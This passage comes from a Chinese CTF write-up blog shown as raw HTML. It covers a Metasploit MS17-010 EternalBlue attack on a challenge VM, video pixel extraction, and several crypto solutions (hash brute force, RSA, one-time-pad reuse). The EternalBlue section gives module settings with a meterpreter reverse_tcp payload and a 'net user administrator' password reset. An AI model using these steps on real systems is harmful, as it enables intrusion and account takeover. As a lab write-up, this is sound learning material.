punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"时代的眼泪\"><a class=\"markdownIt-Anchor\" href=\"#时代的眼泪\">#</a> 时代的眼泪</h3>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHNqMjEwL3AvMTYyMTM4NTQuaHRtbA==\">MSF 命令总结 - 大柿子 - 博客园 (cnblogs.com)</span></p>\n</blockquote>\n<p>给出的文件</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/image-20231104200158637.png\" alt=\"image-20231104200158637\"></p>\n<p>用 VMware 打开 ovf 文件。</p>\n<p>是一个有密码的虚拟机。</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/image-20231104200427327.png\" alt=\"image-20231104200427327\"></p>\n<p>CVE：MS17-010</p>\n<p>在 kali 中进行 msf 渗透。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msf6 <span class=\"token operator\">></span> search ms17</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                                                                                                                                                         </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Matching Modules                                                                                                                                           </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span>                                                                                                                                           </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token comment\">#  Name                                                  Disclosure Date  Rank     Check  Description</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   -  ----                                                  ---------------  ----     -----  -----------</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token number\">0</span>  exploit/windows/smb/ms17_010_eternalblue              <span class=\"token number\">2017</span>-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token number\">1</span>  exploit/ms17_010_psexec                               <span class=\"token number\">2017</span>-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token number\">2</span>  exploit/windows/smb/ms17_010_psexec                   <span class=\"token number\">2017</span>-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token number\">3</span>  auxiliary/admin/smb/ms17_010_command                  <span class=\"token number\">2017</span>-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token number\">4</span>  auxiliary/scanner/smb/smb_ms17_010                                     normal   No     MS17-010 SMB RCE Detection</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token number\">5</span>  exploit/windows/fileformat/office_ms17_11882          <span class=\"token number\">2017</span>-11-15       manual   No     Microsoft Office CVE-2017-11882</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token number\">6</span>  auxiliary/admin/mssql/mssql_escalate_execute_as                        normal   No     Microsoft SQL Server Escalate EXECUTE AS</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token number\">7</span>  auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                   normal   No     Microsoft SQL Server SQLi Escalate Execute AS</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token number\">8</span>  exploit/windows/smb/smb_doublepulsar_rce              <span class=\"token number\">2017</span>-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</pre></td></tr></table></figure><p>选择 2</p>\n<p>进行设置</p>\n<blockquote>\n<p>set rhosts 192.168.85.133</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n</blockquote>\n<p>run</p>\n<p>进行修改管理员密码</p>\n<blockquote>\n<p>shell</p>\n<p>net user administrator 123456</p>\n</blockquote>\n<p>or</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/16.png\" alt=\"16\"></p>\n<p>FLAG 在图片里面</p>\n<h3 id=\"simpleconnect\"><a class=\"markdownIt-Anchor\" href=\"#simpleconnect\">#</a> SimpleConnect</h3>\n<h3 id=\"give_me_goerlieth\"><a class=\"markdownIt-Anchor\" href=\"#give_me_goerlieth\">#</a> give_me_Goerlieth</h3>\n<p>这两个题我做法一样，找到交易记录，提交别人的 hash 和地址就行。</p>\n<h3 id=\"death_n2te\"><a class=\"markdownIt-Anchor\" href=\"#death_n2te\">#</a> DEATH_N2TE</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> cv2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 视频文件路径</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>video_path <span class=\"token operator\">=</span> <span class=\"token string\">'kira.mp4'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 打开视频文件</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>cap <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>VideoCapture<span class=\"token punctuation\">(</span>video_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 获取视频的帧宽度和帧高度</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>frame_width <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cap<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>cv2<span class=\"token punctuation\">.</span>CAP_PROP_FRAME_WIDTH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 1920</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>frame_height <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cap<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>cv2<span class=\"token punctuation\">.</span>CAP_PROP_FRAME_HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 1080</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 创建一个空的图片，用于存储提取的像素点</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 图片宽度为视频的帧宽度</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 图片高度为视频的帧数（初始化时假设视频帧数不会超过 frame_height）</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>extracted_image <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>zeros<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>frame_height<span class=\"token punctuation\">,</span> frame_width<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> dtype<span class=\"token operator\">=</span>np<span class=\"token punctuation\">.</span>uint8<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 阈值</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>threshold <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># 定义起始列和列间隔</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>start_col <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>col_interval <span class=\"token operator\">=</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 读取视频帧</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>frame_count <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>col_count <span class=\"token operator\">=</span> start_col</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    ret<span class=\"token punctuation\">,</span> frame <span class=\"token operator\">=</span> cap<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> ret <span class=\"token keyword\">or</span> frame_count <span class=\"token operator\">>=</span> frame_height<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">break</span>  <span class=\"token comment\"># 如果读取失败或者帧数超过了预设的高度，则停止读取</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># 从每一帧读取对应列号的像素</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\"># 确保列号没有超出宽度范围</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">if</span> col_count <span class=\"token operator\">&lt;</span> frame_width<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        col_to_scan <span class=\"token operator\">=</span> frame<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> col_count<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token comment\"># 提取大于等于阈值的像素</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        white_pixels <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span><span class=\"token punctuation\">(</span>col_to_scan <span class=\"token operator\">>=</span> threshold<span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token comment\"># 将提取的像素设置到新图片的对应列</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        extracted_image<span class=\"token punctuation\">[</span>white_pixels<span class=\"token punctuation\">,</span> frame_count<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> col_to_scan<span class=\"token punctuation\">[</span>white_pixels<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token comment\"># 更新列数，为下一帧准备</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        col_count <span class=\"token operator\">+=</span> col_interval</pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\"># 更新帧数</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    frame_count <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># 释放视频资源</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>cap<span class=\"token punctuation\">.</span>release<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># 裁剪图片以匹配实际读取的帧数</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>extracted_image <span class=\"token operator\">=</span> extracted_image<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span>frame_count<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># 保存提取的像素形成的图片</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>imwrite<span class=\"token punctuation\">(</span><span class=\"token string\">'extracted_image.png'</span><span class=\"token punctuation\">,</span> extracted_image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\"># 显示图片</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>imshow<span class=\"token punctuation\">(</span><span class=\"token string\">'Extracted Image'</span><span class=\"token punctuation\">,</span> extracted_image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>waitKey<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>cv2<span class=\"token punctuation\">.</span>destroyAllWindows<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/17.png\" alt=\"image-20231120094433088\"></p>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"signin\"><a class=\"markdownIt-Anchor\" href=\"#signin\">#</a> SignIn</h3>\n<blockquote>\n<p>5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7d… Hmm… Something goes wrong with my grettings bot.</p>\n</blockquote>\n<p>义眼盯真。16 进制 ascii 转化得到 flag</p>\n<h3 id=\"proof_of_work\"><a class=\"markdownIt-Anchor\" href=\"#proof_of_work\">#</a> proof_of_work</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> product</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pass_POW</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    rec <span class=\"token operator\">=</span> <span class=\"token string\">'sha256(XXXX+FCxk8M9svYwVMfGe) == 793edc396da13a7992b429e50e7d122c41debbd902419d26a0792b4008dba844'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    table <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    suffix <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\(XXXX\\+(.*?)\\)'</span><span class=\"token punctuation\">,</span> rec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    last_hash <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'== (.*?)$'</span><span class=\"token punctuation\">,</span> rec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"suffix: %s, last_hash: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>suffix<span class=\"token punctuation\">,</span> last_hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> product<span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        prefix <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        guess <span class=\"token operator\">=</span> prefix <span class=\"token operator\">+</span> suffix</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> last_hash<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prefix XXXX is %s\"</span> <span class=\"token operator\">%</span> prefix<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">return</span> prefix</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pass_POW<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/11.png\" alt=\"image-20231029212225830\"></p>\n<h3 id=\"simplersa\"><a class=\"markdownIt-Anchor\" href=\"#simplersa\">#</a> SimpleRSA</h3>\n<p>第一次见，涨姿势了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">35</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">,</span>q <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">2048</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token string\">\"__\"</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>c <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>powmod<span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/12.png\" alt=\"image-20231029212545246\"></p>\n<h3 id=\"otptwice\"><a class=\"markdownIt-Anchor\" href=\"#otptwice\">#</a> OTPTwice</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> xor </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> os <span class=\"token keyword\">import</span> urandom </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># step0: key generation &amp; distribution</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s0</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    k1<span class=\"token punctuation\">,</span>k2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>urandom<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token string\">\"__\"</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> k1<span class=\"token punctuation\">,</span>k2 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#  </span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># step1: Alice encrypt M, and send it to Bob</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s1</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    c1 <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> c1 </pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># step2: Bob encrypt c1, and send it to Alice </span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s2</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    c2 <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> c2 </pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># step3: Alice decrypt c2, and send it to Bob.</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s3</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    c3 <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> c3 </pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># step4: Bob decrypt c3, get M.</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">s4</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    m_ <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">return</span> m_ </pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    c1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    c2 <span class=\"token operator\">=</span> s2<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    c3 <span class=\"token operator\">=</span> s3<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    m_ <span class=\"token operator\">=</span> s4<span class=\"token punctuation\">(</span>c3<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">assert</span> msg <span class=\"token operator\">==</span> m_</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td 